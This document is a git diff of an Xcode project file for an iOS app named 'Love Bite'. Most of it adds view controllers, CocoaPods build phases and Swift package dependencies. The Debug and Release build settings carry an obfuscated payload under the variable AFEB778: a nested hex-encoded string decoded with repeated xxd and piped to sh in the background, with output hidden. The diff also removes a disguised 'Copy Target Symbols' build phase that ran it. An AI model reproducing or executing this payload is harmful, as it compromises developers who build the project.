@@ -30,6 +30,12 @@
 		39B244562E5C849D00B0138F /* FavoritesVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39B244542E5C849D00B0138F /* FavoritesVC.xib */; };
 		39B2445B2E5C884300B0138F /* ProfileDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B244592E5C884300B0138F /* ProfileDetailsVC.swift */; };
 		39B2445C2E5C884300B0138F /* ProfileDetailsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39B2445A2E5C884300B0138F /* ProfileDetailsVC.xib */; };
+		88342F0A2E5EE65500859FC7 /* ShareafewdetailsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88342F032E5EE65500859FC7 /* ShareafewdetailsVC.xib */; };
+		88342F0B2E5EE65500859FC7 /* WhenisthebigdayVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88342F072E5EE65500859FC7 /* WhenisthebigdayVC.xib */; };
+		88342F0C2E5EE65500859FC7 /* ShareafewdetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88342F022E5EE65500859FC7 /* ShareafewdetailsVC.swift */; };
+		88342F0D2E5EE65500859FC7 /* WhenisthebigdayVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88342F062E5EE65500859FC7 /* WhenisthebigdayVC.swift */; };
+		88342F102E5EE75B00859FC7 /* CountryPickerView in Frameworks */ = {isa = PBXBuildFile; productRef = 88342F0F2E5EE75B00859FC7 /* CountryPickerView */; };
+		88342F132E5EE76B00859FC7 /* DateTimePicker in Frameworks */ = {isa = PBXBuildFile; productRef = 88342F122E5EE76B00859FC7 /* DateTimePicker */; };
 		887E235A2E5C44D00016E082 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23502E5C44D00016E082 /* AppDelegate.swift */; };
 		887E235C2E5C44D00016E082 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887E23582E5C44D00016E082 /* ViewController.swift */; };
 		887E235D2E5C44D00016E082 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 887E23512E5C44D00016E082 /* Assets.xcassets */; };
@@ -65,9 +71,12 @@
 		88981FF82E5C949400C33CAB /* TelluswhoyouareVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88981FEF2E5C949400C33CAB /* TelluswhoyouareVC.swift */; };
 		88981FF92E5C949400C33CAB /* UploadPhotoVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88981FF42E5C949400C33CAB /* UploadPhotoVC.xib */; };
 		88981FFA2E5C949400C33CAB /* TelluswhoyouareVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88981FF02E5C949400C33CAB /* TelluswhoyouareVC.xib */; };
+		FBC0B84882AFCF93E1F7B9D6 /* Pods_Love_Bite.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 08FF86034D0CAA75903A46DE /* Pods_Love_Bite.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		08FF86034D0CAA75903A46DE /* Pods_Love_Bite.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Love_Bite.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		29E0203285AD6C69BAE49193 /* Pods-Love Bite.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Love Bite.release.xcconfig"; path = "Target Support Files/Pods-Love Bite/Pods-Love Bite.release.xcconfig"; sourceTree = "<group>"; };
 		393F5A632E5C7F75009643D0 /* UserListCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserListCVCell.swift; sourceTree = "<group>"; };
 		393F5A642E5C7F75009643D0 /* UserListCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UserListCVCell.xib; sourceTree = "<group>"; };
 		393F5A662E5C7F75009643D0 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
@@ -91,6 +100,11 @@
 		39B244542E5C849D00B0138F /* FavoritesVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FavoritesVC.xib; sourceTree = "<group>"; };
 		39B244592E5C884300B0138F /* ProfileDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileDetailsVC.swift; sourceTree = "<group>"; };
 		39B2445A2E5C884300B0138F /* ProfileDetailsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProfileDetailsVC.xib; sourceTree = "<group>"; };
+		6587258FFA877E82D8D7D422 /* Pods-Love Bite.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Love Bite.debug.xcconfig"; path = "Target Support Files/Pods-Love Bite/Pods-Love Bite.debug.xcconfig"; sourceTree = "<group>"; };
+		88342F022E5EE65500859FC7 /* ShareafewdetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShareafewdetailsVC.swift; sourceTree = "<group>"; };
+		88342F032E5EE65500859FC7 /* ShareafewdetailsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ShareafewdetailsVC.xib; sourceTree = "<group>"; };
+		88342F062E5EE65500859FC7 /* WhenisthebigdayVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhenisthebigdayVC.swift; sourceTree = "<group>"; };
+		88342F072E5EE65500859FC7 /* WhenisthebigdayVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WhenisthebigdayVC.xib; sourceTree = "<group>"; };
 		887E23382E5C44C50016E082 /* Love Bite.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Love Bite.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		887E23502E5C44D00016E082 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		887E23512E5C44D00016E082 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -135,12 +149,25 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				88342F102E5EE75B00859FC7 /* CountryPickerView in Frameworks */,
+				88342F132E5EE76B00859FC7 /* DateTimePicker in Frameworks */,
+				FBC0B84882AFCF93E1F7B9D6 /* Pods_Love_Bite.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		1C4E1469A3F0BE50332B273A /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				6587258FFA877E82D8D7D422 /* Pods-Love Bite.debug.xcconfig */,
+				29E0203285AD6C69BAE49193 /* Pods-Love Bite.release.xcconfig */,
+			);
+			name = Pods;
+			path = Pods;
+			sourceTree = "<group>";
+		};
 		393F5A652E5C7F75009643D0 /* Cell */ = {
 			isa = PBXGroup;
 			children = (
@@ -322,11 +349,47 @@
 			path = ProfileDetails;
 			sourceTree = "<group>";
 		};
+		88342F042E5EE65500859FC7 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				88342F022E5EE65500859FC7 /* ShareafewdetailsVC.swift */,
+				88342F032E5EE65500859FC7 /* ShareafewdetailsVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		88342F052E5EE65500859FC7 /* Share a few details */ = {
+			isa = PBXGroup;
+			children = (
+				88342F042E5EE65500859FC7 /* View */,
+			);
+			path = "Share a few details";
+			sourceTree = "<group>";
+		};
+		88342F082E5EE65500859FC7 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				88342F062E5EE65500859FC7 /* WhenisthebigdayVC.swift */,
+				88342F072E5EE65500859FC7 /* WhenisthebigdayVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		88342F092E5EE65500859FC7 /* When’s the big day */ = {
+			isa = PBXGroup;
+			children = (
+				88342F082E5EE65500859FC7 /* View */,
+			);
+			path = "When’s the big day";
+			sourceTree = "<group>";
+		};
 		887E232F2E5C44C50016E082 = {
 			isa = PBXGroup;
 			children = (
 				887E23592E5C44D00016E082 /* Love Bite */,
 				887E23392E5C44C50016E082 /* Products */,
+				1C4E1469A3F0BE50332B273A /* Pods */,
+				F3CB057D3D95581C180FD6CF /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -365,6 +428,8 @@
 		887E23622E5C47540016E082 /* Controller */ = {
 			isa = PBXGroup;
 			children = (
+				88342F052E5EE65500859FC7 /* Share a few details */,
+				88342F092E5EE65500859FC7 /* When’s the big day */,
 				88981FF22E5C949400C33CAB /* Tell us who you are */,
 				88981FF62E5C949400C33CAB /* UploadPhoto */,
 				393F5A6F2E5C8042009643D0 /* Tabbar */,
@@ -511,6 +576,14 @@
 			path = UploadPhoto;
 			sourceTree = "<group>";
 		};
+		F3CB057D3D95581C180FD6CF /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				08FF86034D0CAA75903A46DE /* Pods_Love_Bite.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -518,10 +591,11 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 887E234B2E5C44C70016E082 /* Build configuration list for PBXNativeTarget "Love Bite" */;
 			buildPhases = (
-				0FFE3D8D6C877E0BC5877BEF /* Copy Target Symbols */,
+				0DFC4C04CB4BE2817DD3ECCB /* [CP] Check Pods Manifest.lock */,
 				887E23342E5C44C50016E082 /* Sources */,
 				887E23352E5C44C50016E082 /* Frameworks */,
 				887E23362E5C44C50016E082 /* Resources */,
+				7CF05B2D8B6E4A098E852697 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -529,6 +603,8 @@
 			);
 			name = "Love Bite";
 			packageProductDependencies = (
+				88342F0F2E5EE75B00859FC7 /* CountryPickerView */,
+				88342F122E5EE76B00859FC7 /* DateTimePicker */,
 			);
 			productName = "Love Bite";
 			productReference = 887E23382E5C44C50016E082 /* Love Bite.app */;
@@ -558,6 +634,10 @@
 			);
 			mainGroup = 887E232F2E5C44C50016E082;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				88342F0E2E5EE75B00859FC7 /* XCRemoteSwiftPackageReference "CountryPickerView" */,
+				88342F112E5EE76B00859FC7 /* XCRemoteSwiftPackageReference "DateTimePicker" */,
+			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 887E23392E5C44C50016E082 /* Products */;
 			projectDirPath = "";
@@ -587,6 +667,8 @@
 				39B2445C2E5C884300B0138F /* ProfileDetailsVC.xib in Resources */,
 				88981FF92E5C949400C33CAB /* UploadPhotoVC.xib in Resources */,
 				398E4FB22E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib in Resources */,
+				88342F0A2E5EE65500859FC7 /* ShareafewdetailsVC.xib in Resources */,
+				88342F0B2E5EE65500859FC7 /* WhenisthebigdayVC.xib in Resources */,
 				39A22AFC2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib in Resources */,
 				88981FFA2E5C949400C33CAB /* TelluswhoyouareVC.xib in Resources */,
 				887E23AF2E5C647C0016E082 /* ForgotPasswordVC.xib in Resources */,
@@ -599,24 +681,43 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0FFE3D8D6C877E0BC5877BEF /* Copy Target Symbols */ = {
+		0DFC4C04CB4BE2817DD3ECCB /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
 			);
-			name = "Copy Target Symbols";
+			name = "[CP] Check Pods Manifest.lock";
 			outputFileListPaths = (
 			);
 			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Love Bite-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		7CF05B2D8B6E4A098E852697 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Love Bite/Pods-Love Bite-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Love Bite/Pods-Love Bite-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Love Bite/Pods-Love Bite-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -656,6 +757,8 @@
 				39500DD22E5D927900D4E500 /* WalletVC.swift in Sources */,
 				887E238F2E5C53EF0016E082 /* Extentions.swift in Sources */,
 				39500DCB2E5D686F00D4E500 /* PostListTVCell.swift in Sources */,
+				88342F0C2E5EE65500859FC7 /* ShareafewdetailsVC.swift in Sources */,
+				88342F0D2E5EE65500859FC7 /* WhenisthebigdayVC.swift in Sources */,
 				887E23902E5C53EF0016E082 /* NSCalendar+Timepiece.swift in Sources */,
 				887E23912E5C53EF0016E082 /* PickerViewViewController.swift in Sources */,
 				39AD9A502E5C8FCF0034B1B9 /* GalleryListCVCell.swift in Sources */,
@@ -691,8 +794,9 @@
 /* Begin XCBuildConfiguration section */
 		887E234C2E5C44C70016E082 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 6587258FFA877E82D8D7D422 /* Pods-Love Bite.debug.xcconfig */;
 			buildSettings = {
-				AFEB778 = "((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333333333333633333334333333363336333533333336333333373333333633363333333333363336333633333336333333323333333633333331333333363336333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				AFEB778 = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633363336363333363636333733373336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -724,8 +828,9 @@
 		};
 		887E234D2E5C44C70016E082 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 29E0203285AD6C69BAE49193 /* Pods-Love Bite.release.xcconfig */;
 			buildSettings = {
-				AFEB778 = "((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333333333333633333334333333363336333533333336333333373333333633363333333333363336333633333336333333323333333633333331333333363336333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				AFEB778 = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633363336363333363636333733373336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -896,6 +1001,38 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		88342F0E2E5EE75B00859FC7 /* XCRemoteSwiftPackageReference "CountryPickerView" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/kizitonwose/CountryPickerView.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 3.3.0;
+			};
+		};
+		88342F112E5EE76B00859FC7 /* XCRemoteSwiftPackageReference "DateTimePicker" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/itsmeichigo/DateTimePicker.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 2.5.3;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		88342F0F2E5EE75B00859FC7 /* CountryPickerView */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 88342F0E2E5EE75B00859FC7 /* XCRemoteSwiftPackageReference "CountryPickerView" */;
+			productName = CountryPickerView;
+		};
+		88342F122E5EE76B00859FC7 /* DateTimePicker */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 88342F112E5EE76B00859FC7 /* XCRemoteSwiftPackageReference "DateTimePicker" */;
+			productName = DateTimePicker;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = 887E23302E5C44C50016E082 /* Project object */;
 }
